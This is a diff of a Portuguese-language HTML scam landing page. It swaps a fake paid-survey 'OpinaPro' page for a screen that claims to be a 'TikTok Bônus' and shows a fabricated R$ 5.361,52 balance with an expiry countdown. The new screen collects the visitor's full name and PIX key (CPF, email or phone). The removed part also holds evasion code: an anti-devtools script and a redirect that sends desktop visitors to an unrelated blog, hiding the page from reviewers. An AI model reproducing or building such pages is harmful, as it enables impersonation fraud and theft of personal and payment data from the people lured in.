@@ -1,931 +1,1008 @@
 <!DOCTYPE html><html lang="pt-BR"><head>
-<meta charset="utf-8">
-  <script src="js/script.js" async="" data-tracking-id="DyJ2Dcchti" crossorigin="anonymous"></script>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
-  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="css/styles.css">
-  <script src="js/jquery-3.6.4.min.js"></script>
-  <script src="js/js.cookie.min.js"></script>
-  </head><body><audio id="meuAudio"><source src="media/dinheiro.mp3" type="audio/mp3"></audio>
-  <script disable-devtool-auto="" src="disable-devtool-1.html" url="https://meutudo.com.br/blog/guia-do-saque-aniversario/"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
 <script type="text/javascript">
-  if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
-    window.location.href = 'https://mindminers.com/blog/personal-care-autocuidado-e-a-busca-pelo-bem-estar/';
-  }
-  </script>
-<!-- TikTok Pixel Code Start -->
-<script>
-!function (w, d, t) {
-  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
-var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
-;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
-
-
-  ttq.load('D57BKSJC77U9GK0PHCVG');
-  ttq.page();
-}(window, document, 'ttq');
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "upjh2883u4");
 </script>
-<!-- TikTok Pixel Code End -->
-</head>
-<body>
-  
-  <!--------------------- Pagina de login" --------------------->
-  
-  
-  <div id="login" style="display: block;">
-        
-    <div style="padding-top:30%;"></div>
 
-        <div class="outer-box-login">
-          <div class="white-box-login">
-            <img src="images/opinilogo.png" style="width:30%; margin: 0 auto; display: flex;">
-            <p class="popup-textL" style="text-align: center; color: rgb(101, 101, 101); font-weight: bold; font-size: 18px;">Bem-vindo(a) ao OpinaPro</p>
-            <p class="popup-textL" style="text-align: center; color: rgb(101, 101, 101); font-size: 15px;">Insira seu e-mail para prosseguir!</p>
-            
-            <input for="email" type="text" name="email" id="email" class="form-input" style="margin-top:20px;" placeholder="E-mail" oninput="validateEmail()">
-            <button class="prosseguir-button" id="prosseguir-button" style="margin-top: 15px;" onclick="verificarCampos()" href="#">ENTRAR</button>
-                
-            <div style="margin-bottom: 10px;"></div>
-                
+    <link rel="stylesheet" href="css/style.css">
+    <title>Document</title>
+  </head>
+  <body>
+    <main id="screens">
+      <section id="one" class="screen">
+        <div class="title">TikTok Bônus</div>
+        <div class="saldo">
+          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+            <div class="saldo-info">
+              <div class="saldo-label">
+                <span class="saldo-text">Seu saldo</span>
+                <img src="images/p-saldo.svg" alt="" class="p-saldo">
+              </div>
 
-               
-          </div>  
-        </div>
-    
+              <div id="saldo-valor" class="saldo-valor" aria-live="polite">
+                <span class="valor-currency valor-currency-dois valor-currency-tres" data-amount-target="5361.52">R$ 5.361,52</span>
+              </div>
+            </div>
 
-        <div class="footer-text">
-          <p style="text-align: center; color: rgb(101, 101, 101); font-size: 15px; margin-top: 30px; font-weight: bold;">2025 OpinaPro LLC</p>
-          <p style="text-align: center; color: rgb(101, 101, 101); font-size: 14px; margin-top: -10px; margin-bottom: 0px;">Termos e Politica de Privacidade</p>
-        </div>
-
-
-
-  </div>
-  
-  
-  
-
-
-
-  
-  <div id="inicio" style="display: none;">
-
-        <div class="menu">
-          <a style="width: 50%; ">
-            <img src="images/opinilogo.png">
-          </a>
-          <div style="width: 45%;" class="buttons-container" href="#" onclick="mostrarPagina('saque')">
-            <div class="valor-box">
-              <span id="valor" style="font-family: 'Montserrat', sans-serif; max-width: 100%;">R$ 100.00</span>
+            <div class="saldo-action">
+              <button type="button" class="btn-sacar" aria-label="Sacar" disabled="">
+                <span class="btn-text">Sacar</span>
+                <span class="pix-badge" aria-hidden="true">
+                  <img src="images/pix-logo.svg" alt="">
+                </span>
+              </button>
             </div>
           </div>
         </div>
-        <div style="margin-bottom: 100px;"></div>
-          
-        
-    <!--------------------- Anuncio 1 --------------------->
-    
-    <div class="outer-box" id="ad1" style="display: block;">
-      <div class="white-box">
-         
-          <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$33,00!</p>
-          
-          <div class="imagem">
-            <img src="images/caixa.png" style="width: 50%; margin: 0 auto; display: flex;">
+        <div class="bloco-dois">
+          <div class="parabens">
+            <div class="parabens-txt">
+              <span class="parabens-txtum">Parabéns!</span>
+              <span class="parabens-txtdois">Você concluiu
+                <span class="nobreak">todas as tarefas</span></span>
+
+              <span class="parabens-valor">R$ 5.361,52</span>
+            </div>
+            <img src="images/parabens-img.png" alt="" class="parabens-img">
           </div>
-
-          <p class="pergunta-whats">De 1 a 5, que nota voce da para o atendimento do banco Inter?</p>
-
-          <div class="rating-container" id="rating-container-1">
-            <button class="rating-button" data-rating="1">1 </button>
-            <button class="rating-button" data-rating="2">2 </button>
-            <button class="rating-button" data-rating="3">3 </button>
-            <button class="rating-button" data-rating="4">4 </button>
-            <button class="rating-button" data-rating="5">5 </button>
+          <div class="line"></div>
+          <div class="entre">
+            <span class="entre-txt">Entre por 14 dias para ganhar
+              <span class="entre-pts">8.414 pontos</span>
+              <span class="entre-data">• 12 de nov - 25 de nov</span>
+            </span>
+            <button type="button" class="btn-concluido" aria-label="Sacar">
+              <span class="btn-concluido-text">Concluído</span>
+            </button>
           </div>
-          
-          <p class="pergunta-whats">Em um banco, voce prefere um cartao com limite maior ou menores taxas?</p>
-
-          <div class="rating-container" id="rating-container-2">
-            <button class="rating-button" data-rating="1">Limite maior</button>
-            <button class="rating-button" data-rating="2">Menores taxas</button>
+          <div class="concluiu">
+            <span class="concluiu-txt">Você concluiu todos os dias de check-in.</span>
           </div>
+          <div class="dia">
+            <div class="day-tracker">
+              <div class="day-tracker__item">
+                <div class="day-tracker__box">
+                  <div class="day-tracker__content">
+                    <div class="day-tracker__coin">
+                      <img src="images/p-dia.svg" alt="">
+                    </div>
+                    <div class="day-tracker__value">50</div>
+                  </div>
 
-          <p class="pergunta-whats">Voce faria um emprestimo nesse banco atualmente?</p>
+                  <div class="day-tracker__overlay">
+                    <div class="day-tracker__icon-wrapper">
+                      <div class="day-tracker__icon-shape">
+                        <img src="images/fi-bs-check.svg" alt="">
+                      </div>
+                    </div>
+                  </div>
+                </div>
 
-          <div class="rating-container" id="rating-container-3">
-            <button class="rating-button" data-rating="1">Sim</button>
-            <button class="rating-button" data-rating="2">Nao </button>
+                <div class="day-tracker__label">Dia 01</div>
+              </div>
+
+              <div class="day-tracker__item">
+                <div class="day-tracker__box">
+                  <div class="day-tracker__content">
+                    <div class="day-tracker__coin">
+                      <img src="images/p-dia.svg" alt="">
+                    </div>
+                    <div class="day-tracker__value">100</div>
+                  </div>
+
+                  <div class="day-tracker__overlay">
+                    <div class="day-tracker__icon-wrapper">
+                      <div class="day-tracker__icon-shape">
+                        <img src="images/fi-bs-check.svg" alt="">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="day-tracker__label">Dia 02</div>
+              </div>
+
+              <div class="day-tracker__item">
+                <div class="day-tracker__box">
+                  <div class="day-tracker__content">
+                    <div class="day-tracker__coin">
+                      <img src="images/p-dia.svg" alt="">
+                    </div>
+                    <div class="day-tracker__value">150</div>
+                  </div>
+
+                  <div class="day-tracker__overlay">
+                    <div class="day-tracker__icon-wrapper">
+                      <div class="day-tracker__icon-shape">
+                        <img src="images/fi-bs-check.svg" alt="">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="day-tracker__label">Dia 03</div>
+              </div>
+
+              <div class="day-tracker__item">
+                <div class="day-tracker__box">
+                  <div class="day-tracker__content">
+                    <div class="day-tracker__coin">
+                      <img src="images/p-dia.svg" alt="">
+                    </div>
+                    <div class="day-tracker__value">200</div>
+                  </div>
+
+                  <div class="day-tracker__overlay">
+                    <div class="day-tracker__icon-wrapper">
+                      <div class="day-tracker__icon-shape">
+                        <img src="images/fi-bs-check.svg" alt="">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="day-tracker__label">Dia 04</div>
+              </div>
+
+              <div class="day-tracker__item">
+                <div class="day-tracker__box">
+                  <div class="day-tracker__content">
+                    <div class="day-tracker__coin">
+                      <img src="images/p-dia.svg" alt="">
+                    </div>
+                    <div class="day-tracker__value">250</div>
+                  </div>
+
+                  <div class="day-tracker__overlay">
+                    <div class="day-tracker__icon-wrapper">
+                      <div class="day-tracker__icon-shape">
+                        <img src="images/fi-bs-check.svg" alt="">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="day-tracker__label">Dia 05</div>
+              </div>
+
+              <div class="day-tracker__item">
+                <div class="day-tracker__box">
+                  <div class="day-tracker__content">
+                    <div class="day-tracker__coin">
+                      <img src="images/p-dia.svg" alt="">
+                    </div>
+                    <div class="day-tracker__value">300</div>
+                  </div>
+
+                  <div class="day-tracker__overlay">
+                    <div class="day-tracker__icon-wrapper">
+                      <div class="day-tracker__icon-shape">
+                        <img src="images/fi-bs-check.svg" alt="">
+                      </div>
+                    </div>
+                  </div>
+                </div>
+
+                <div class="day-tracker__label">Dia 06</div>
+              </div>
+            </div>
           </div>
-              
-          <button type="button" class="enviarCodigo" id="B1" onclick="showLoadingB1();">Enviar respostas</button>
+          <div class="line line-dois"></div>
 
-              
-      </div>
-    </div>
-    
-    <!---- Popup B1 ---->
-        
-        <div class="popup-container" id="popupB1">
-        
-          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+          <div class="entre">
+            <span class="entre-txt entre-txt-dois">Vê anúncios direcionados diariamente para ganhares até
+              <span class="entre-pts">2.730 pontos</span>
+              <span class="entre-data">• 30/30 anúncios assistidos</span>
+            </span>
+            <button type="button" class="btn-concluido" aria-label="Sacar">
+              <span class="btn-concluido-text">Concluído</span>
+            </button>
+          </div>
+          <div class="line line-dois"></div>
 
-         <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
-          
-          <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
-          <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 33,00</span>
-        
+          <div class="entre">
+            <span class="entre-txt entre-txt-dois">Assistir vídeos
+              <span class="entre-pts">500 pontos</span>
+            </span>
+            <button type="button" class="btn-concluido" aria-label="Sacar">
+              <span class="btn-concluido-text">Concluído</span>
+            </button>
+          </div>
+          <div class="assista">
+            <span class="assista-txt">Assista por 10 min </span>
+            <svg class="assista-tail" xmlns="http://www.w3.org/2000/svg" width="7" height="6" viewBox="0 0 7 6" fill="none">
+              <path d="M4.03259 5.25C3.64769 5.91667 2.68544 5.91667 2.30054 5.25L0.135475 1.5C-0.249425 0.833333 0.231701 6.49976e-07 1.0015 5.82678e-07L5.33163 2.04126e-07C6.10143 1.36828e-07 6.58255 0.833334 6.19765 1.5L4.03259 5.25Z" fill="#F1F1F1"></path>
+            </svg>
+          </div>
+          <div class="barra">
+            <div class="progress-bar">
+              <div class="progress-step">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">50 pontos</span>
+              </div>
+
+              <div class="progress-step">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">100 pontos</span>
+              </div>
+
+              <div class="progress-step">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">150 pontos</span>
+              </div>
+
+              <div class="progress-step">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">225 pontos</span>
+              </div>
+            </div>
+            <div class="line line-dois"></div>
+            <div class="entre">
+              <span class="entre-txt entre-txt-dois">Resgate suas recompensas e ganhe
+                <span class="entre-pts">640 pontos</span>
+                <span class="entre-data">• 8/8 resgatados</span>
+              </span>
+              <button type="button" class="btn-concluido" aria-label="Sacar">
+                <span class="btn-concluido-text">Concluído</span>
+              </button>
+            </div>
+            <div class="line line-dois"></div>
+            <div class="entre">
+              <span class="entre-txt entre-txt-dois">Faça 60 pesquisas diárias para ganhar até
+                <span class="entre-pts">996 pontos</span>
+                <span class="entre-data">• 60 pesquisas feitas hoje</span>
+              </span>
+              <button type="button" class="btn-concluido" aria-label="Sacar">
+                <span class="btn-concluido-text">Concluído</span>
+              </button>
+            </div>
+
+            <!-- ADICIONEI A CLASSE "posicao-direita" AQUI -->
+            <div class="assista posicao-direita">
+              <span class="assista-txt">Até 756 pontos</span>
+              <svg class="assista-tail taildois" xmlns="http://www.w3.org/2000/svg" width="7" height="6" viewBox="0 0 7 6" fill="none">
+                <path d="M4.03259 5.25C3.64769 5.91667 2.68544 5.91667 2.30054 5.25L0.135475 1.5C-0.249425 0.833333 0.231701 6.49976e-07 1.0015 5.82678e-07L5.33163 2.04126e-07C6.10143 1.36828e-07 6.58255 0.833334 6.19765 1.5L4.03259 5.25Z" fill="#F1F1F1"></path>
+              </svg>
+            </div>
+            <div class="progress-bar">
+              <div class="progress-step hide">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">16 pesquisas</span>
+              </div>
+
+              <div class="progress-step">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">36 pesquisas</span>
+              </div>
+
+              <div class="progress-step">
+                <div class="step-icon">
+                  <img src="images/p-assista.svg" alt="P">
+                </div>
+                <span class="step-text">60 pesquisas</span>
+              </div>
+            </div>
+            <div class="obtem">
+              <span class="obtem-txt">Obtém 21 pontos por escreveres uma consulta na barra de
+                pesquisa, ou 0 ponto por tocares numa pesquisa sugerida, como em
+                "Podes gostar".</span>
+            </div>
+            <div class="line line-dois"></div>
+
+            <div class="entre">
+              <span class="entre-txt">Convide 1 amigo para se inscrever e ganhar
+                <span class="entre-pts">100.000 pontos - 200.000 pontos</span>
+              </span>
+              <button type="button" class="btn-concluido" aria-label="Sacar">
+                <span class="btn-concluido-text">Concluído</span>
+              </button>
+            </div>
+          </div>
         </div>
-        
-    
-    <!--------------------- Anuncio 2 --------------------->
-    
-    <div class="outer-box" id="ad2" style="display: none;">
-      <div class="white-box">
-              
-        <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$34,00!</p>
-          
-        <div class="imagem">
-          <img src="images/bancobrasil.png" style="width: 50%; margin: 0 auto; display: flex; border-radius: 15px;">
+      </section>
+
+      <section id="two" class="screen" aria-hidden="true">
+        <div class="modal-inner" role="dialog" aria-modal="true" aria-labelledby="modal-title">
+          <div class="popup">
+            <img src="images/gol.png" alt="" class="gol-img">
+            <span class="gol">Gol de Prêmios</span>
+            <span class="gol-txt">Parabéns! Como parte de uma campanha de recompensas exclusiva. </span><span class="valor-currency gol-valor valor-currency-dois valor-currency-quatro" data-amount-target="5361.52">R$ 5.361,52</span>
+            <div class="timer-wrapper expira-em-popup">
+              <div class="timer-label">Expira em</div>
+
+              <div class="timer-clock">
+                <!-- Horas -->
+                <div class="timer-box" data-timer="hours">00</div>
+                <!-- Não é usado, mas bom ter -->
+
+                <!-- Separador -->
+                <div class="timer-separator">:</div>
+
+                <!-- Minutos -->
+                <div class="timer-box" data-timer="minutes">16</div>
+                <!-- ADICIONE AQUI -->
+
+                <!-- Separador -->
+                <div class="timer-separator">:</div>
+
+                <!-- Segundos -->
+                <div class="timer-box" data-timer="seconds">38</div>
+                <!-- ADICIONE AQUI -->
+              </div>
+            </div>
+            <button type="button" class="btn-obrigado" aria-label="Obrigado" data-modal-close="">
+              <span class="btn-text btn-textdois btn-txt-obrigado">Obrigado</span>
+            </button>
+          </div>
+        </div>
+      </section>
+      <section id="three" class="screen">
+        <div class="expira-saldo">
+          <div class="timer-wrapper">
+            <p id="countdown-text">
+              SEU SALDO EXPIRA EM
+              <span id="timer">00 - 16 - 38</span>
+            </p>
+          </div>
+        </div>
+        <div class="title">Resgatar recompensas</div>
+        <div class="saldo saldo-dois">
+          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+            <div class="saldo-info saldo-info-dois">
+              <div class="saldo-label">
+                <span class="saldo-text saldo-text-dois">Seu saldo</span>
+              </div>
+
+              <div class="saldo-valor saldo-valor-dois" aria-live="polite">
+                <span class="valor-currency valor-currency-dois" data-amount-target="5361.52">R$5.361,52</span>
+                <span class="total-pontos">= 28.347.200 pontos (s)</span>
+              </div>
+            </div>
+
+            <div class="saldo-action">
+              <span class="saldo-img"><img src="images/p-saldo-maior.png" alt="" class="p-saldo p-saldo-maior"></span>
+            </div>
+          </div>
+        </div>
+        <div class="linha"></div>
+        <div class="saldo saldo-tres">
+          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+            <div class="saldo-info saldo-info-dois">
+              <div class="saldo-valor saldo-valor-dois" aria-live="polite">
+                <span class="total-pontos total-pontos-dois">Última recompensa: R$ 646,43</span>
+              </div>
+            </div>
+          </div>
         </div>
 
-        <p class="pergunta-whats">De 1 a 5, que nota voce da para o atendimento do Nubank?</p>
+        <div class="saldo saldo-sacar">
+          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+            <div class="saldo-info saldo-info-sacar">
+              <div class="saldo-label">
+                <span class="saldo-sacar-text">Sacar dinheiro</span>
+              </div>
 
-        <div class="rating-container" id="rating-container-4">
-          <button class="rating-button" data-rating="1">1 </button>
-          <button class="rating-button" data-rating="2">2 </button>
-          <button class="rating-button" data-rating="3">3 </button>
-          <button class="rating-button" data-rating="4">4 </button>
-          <button class="rating-button" data-rating="5">5 </button>
+              <div class="saldo-valor" aria-live="polite">
+                <span class="transferencia-txt"><img src="images/fi-rs-credit-card.png" alt="">Transferencia via /
+                  <img src="images/pix-logo.svg" alt="" class="pix-logo-transf"></span>
+              </div>
+            </div>
+          </div>
+          <div class="widget-container">
+            <div class="botoes-row botoes-row-sacar">
+              <button class="btn-valor">R$1,5</button>
+              <button class="btn-valor">R$5</button>
+              <button class="btn-valor">R$10</button>
+            </div>
+
+            <button class="btn-valor display-total">R$5.361,52</button>
+          </div>
+          <button type="button" class="btn-obrigado btn-sacar-dois btn-sacar-indisponivel" aria-label="sacar dinheiro">
+            <span class="btn-text btn-textdois-sacar btn-three-saque">Sacar dinheiro</span>
+          </button>
+          <div class="obtem obtem-sacar sacar-dinheiro">
+            <span class="obtem-txt">Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os
+              limites de saque para transações individuais e mensais podem
+              variar conforme o pais ou região.</span>
+          </div>
         </div>
-        
-        <p class="pergunta-whats">Em um banco, voce prefere um cartao com limite maior ou menores taxas?</p>
 
-        <div class="rating-container" id="rating-container-5">
-          <button class="rating-button" data-rating="1">Limite maior</button>
-          <button class="rating-button" data-rating="2">Menores taxas</button>
+        <div class="saldo saldo-sacar">
+          <div class="container-saldo ctn-flor" role="region" aria-labelledby="saldo-title">
+            <img src="images/flor.png" alt="" class="flor">
+            <div class="saldo-info obtenha-title">
+              <div class="saldo-label">
+                <span class="saldo-sacar-text obtenha-txt">Obtenha Moedas para a LIVE</span>
+              </div>
+
+              <div class="saldo-valor saldo-valor-tres border-none" aria-live="polite">
+                <span class="transferencia-txt moedas-txt">Use Moedas para enviar presentes virtuais para seus hosts de
+                  live Favoritos.</span>
+              </div>
+            </div>
+          </div>
+
+          <button type="button" class="btn-sacar-indisponivel" aria-label="sacar dinheiro">
+            <span class="btn-text btn-indis">Indisponível</span>
+          </button>
+          <!-- <div class="obtem obtem-sacar">
+            <span class="obtem-txt"
+              >Para sacar ddasdasinheiro, você precisa de um saldo mínimo de
+              R$1,5. Os limites de saque para transações individuais e mensais
+              podem variar conforme o pais ou região.</span
+            >
+          </div> -->
         </div>
 
-        <p class="pergunta-whats">Voce faria um emprestimo nesse banco atualmente?</p>
+        <div class="saldo saldo-sacar">
+          <div class="container-saldo" role="region" aria-labelledby="saldo-title">
+            <div class="saldo-info obtenha-title">
+              <div class="saldo-label">
+                <span class="saldo-sacar-text obtenha-txt">Recarga móvel</span>
+              </div>
 
-        <div class="rating-container" id="rating-container-6">
-          <button class="rating-button" data-rating="1">Sim</button>
-          <button class="rating-button" data-rating="2">Nao </button>
+              <div class="saldo-valor saldo-valor-tres celular-recarga" aria-live="polite">
+                <span class="ddd">+55</span>
+                <span class="linha-ddd"></span>
+                <div class="telefone">12345678901</div>
+              </div>
+            </div>
+          </div>
+
+          <button type="button" class="btn-sacar-indisponivel" aria-label="sacar dinheiro">
+            <span class="btn-text btn-indis">Indisponível</span>
+          </button>
+          <div class="obtem obtem-sacar">
+            <span class="obtem-txt recarga-txt">Voce precisa de um saldo mínimo de R$10 para recarga de
+              celular</span>
+          </div>
         </div>
-            
-        <button type="button" class="enviarCodigo" id="B2" onclick="showLoadingB2();">Enviar respostas</button>
+      </section>
 
-              
-      </div>
-    </div>
-    
-    <!---- Popup B2 ---->
-        
-        <div class="popup-container" id="popupB2">
-        
-          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+      <section id="four" class="modal" aria-hidden="true">
+        <div class="modal-inner inner-pop">
+          <div class="saque-popup">
+            <div class="title saque-title">Adicionar método de saque</div>
+            <span class="pix-item" role="button" tabindex="0" data-open-modal="five">
+              <div class="pix-icon">
+                <img src="images/pix-solo.svg" alt="" class="pix-solo">
+              </div>
 
-          <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
-           
-           <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
-           <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 34,00</span>
-         
+              <div class="pix-details">
+                <span class="pix-title">PIX</span>
+                <span class="pix-subtitle">Recebimento Imediato</span>
+              </div>
 
+              <span class="pix-arrow">
+                <svg xmlns="http://www.w3.org/2000/svg" width="8" height="14" viewBox="0 0 8 14" fill="none">
+                  <path d="M1.411 13.414L0 12L5.28899 6.707L0 1.414L1.415 0L6.69999 5.293C7.07493 5.66806 7.28556 6.17667 7.28556 6.707C7.28556 7.23733 7.07493 7.74594 6.69999 8.121L1.411 13.414Z" fill="#7F7F7F"></path>
+                </svg>
+              </span>
+            </span>
+          </div>
         </div>
-    
-    
-    <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p3" ---------------------->
-    
-      <div class="outer-box" id="ad3" style="display: none;">
-        <div class="white-box">
-            
-          <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">Responda e ganhe R$47,00!</p>
-          
-          <div class="imagem">
-            <img src="images/apple.png" style="width: 20%; margin: 0 auto; display: flex; border-radius: 15px;">
+      </section>
+      <section id="five" class="screen" aria-hidden="true">
+        <div class="modal-inner inner-pop saque-popup">
+          <div class="title saque-title">Vincular PIX</div>
+
+          <div class="form-container">
+            <div class="form-group">
+              <label class="field-label" for="nome">Nome</label>
+              <input type="text" id="nome" placeholder="Nome completo" class="nome-completo">
+            </div>
+
+            <div class="form-group">
+              <label class="field-label">Tipo de Chave PIX</label>
+
+              <div class="pix-selector" id="pix-type-selector" data-open-modal="six" role="button" tabindex="0">
+                <span class="placeholder-text" id="pix-selector-text">Escolha o tipo de chave PIX</span>
+                <span class="arrow arrow-tois"><svg xmlns="http://www.w3.org/2000/svg" width="5" height="9" viewBox="0 0 5 9" fill="none">
+                    <path d="M0.940665 8.94267L0 8L3.52599 4.47133L0 0.942666L0.943332 0L4.46666 3.52867C4.71662 3.7787 4.85704 4.11778 4.85704 4.47133C4.85704 4.82489 4.71662 5.16396 4.46666 5.414L0.940665 8.94267Z" fill="#7F7F7F"></path>
+                  </svg>
+                </span>
+              </div>
+            </div>
+
+            <div class="form-group">
+              <label class="field-label">Chave PIX</label>
+              <!-- Wrapper para detectar clique quando disabled -->
+              <div id="pix-key-wrapper" class="input-wrapper-disabled">
+                <input type="text" id="pix-key-input" placeholder="Digite sua chave PIX" class="nome-completo input-disabled" disabled="">
+              </div>
+            </div>
+
+            <button type="button" id="btn-enviar-pix" class="btn-obrigado btn-sacar-dois btn-vincular btn-disabled" aria-label="sacar dinheiro">
+              <span class="btn-text btn-textdois-sacar">Enviar</span>
+            </button>
           </div>
-  
-          <p class="pergunta-whats">De 1 a 5, que nota voce da para a Samsung?</p>
-  
-          <div class="rating-container" id="rating-container-7">
-            <button class="rating-button" data-rating="1">1 </button>
-            <button class="rating-button" data-rating="2">2 </button>
-            <button class="rating-button" data-rating="3">3 </button>
-            <button class="rating-button" data-rating="4">4 </button>
-            <button class="rating-button" data-rating="5">5 </button>
-          </div>
-          
-          <p class="pergunta-whats">Em uma loja de Eletronicos, voce prefere mais Celular ou Tablet?</p>
-  
-          <div class="rating-container" id="rating-container-8">
-            <button class="rating-button" data-rating="1">Celular</button>
-            <button class="rating-button" data-rating="2">Tablet</button>
-          </div>
-  
-          <p class="pergunta-whats">Com base na sua experiencia geral, voce recomendaria a Apple a amigos e familiares?</p>
-  
-          <div class="rating-container" id="rating-container-9">
-            <button class="rating-button" data-rating="1">Sim</button>
-            <button class="rating-button" data-rating="2">Nao </button>
-          </div>
-              
-          <button type="button" class="enviarCodigo" id="B3" onclick="showLoadingB3();">Enviar respostas</button>
-  
-            
         </div>
-      </div>
-        
-        
-        <!---- Popup B3 ---->
-        
-        <div class="popup-container" id="popupB3">
-        
-          <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script> 
+      </section>
+      <section id="six" class="screen" aria-hidden="true">
+        <div class="modal-inner inner-pop">
+          <div class="saque-popup chave-pix">
+            <div class="title saque-title">Chave PIX</div>
+            <div class="selection-container">
+              <div class="option-row">
+                <label for="key-cpf">
+                  <span class="option-text">CPF</span>
+                  <input type="radio" id="key-cpf" name="pix_key_type" checked="">
+                  <span class="custom-radio"></span>
+                </label>
+              </div>
 
-          <dotlottie-player src="https://lottie.host/7c063f68-5460-4704-bc8d-9a5fd9c04f97/MasdDJB4QX.json" background="transparent.html" speed="1" style="width: 200; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;" loop="" autoplay=""></dotlottie-player>
-           
-           <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
-           <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">R$ 47,00</span>
-         
-        
+              <div class="option-row">
+                <label for="key-email">
+                  <span class="option-text">E-mail</span>
+                  <input type="radio" id="key-email" name="pix_key_type">
+                  <span class="custom-radio"></span>
+                </label>
+              </div>
+
+              <div class="option-row">
+                <label for="key-celular">
+                  <span class="option-text">Celular</span>
+                  <input type="radio" id="key-celular" name="pix_key_type">
+                  <span class="custom-radio"></span>
+                </label>
+              </div>
+
+              <div class="option-row">
+                <label for="key-aleatoria">
+                  <span class="option-text">Chave Aleatória</span>
+                  <input type="radio" id="key-aleatoria" name="pix_key_type">
+                  <span class="custom-radio"></span>
+                </label>
+              </div>
+            </div>
+          </div>
         </div>
-    
-    
-    <!---------------------- ConteÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Âºdo do "p4" ---------------------->
-    
-    <div class="outer-box" id="ad4" style="display: none;">
-        <div class="white-box">
-            
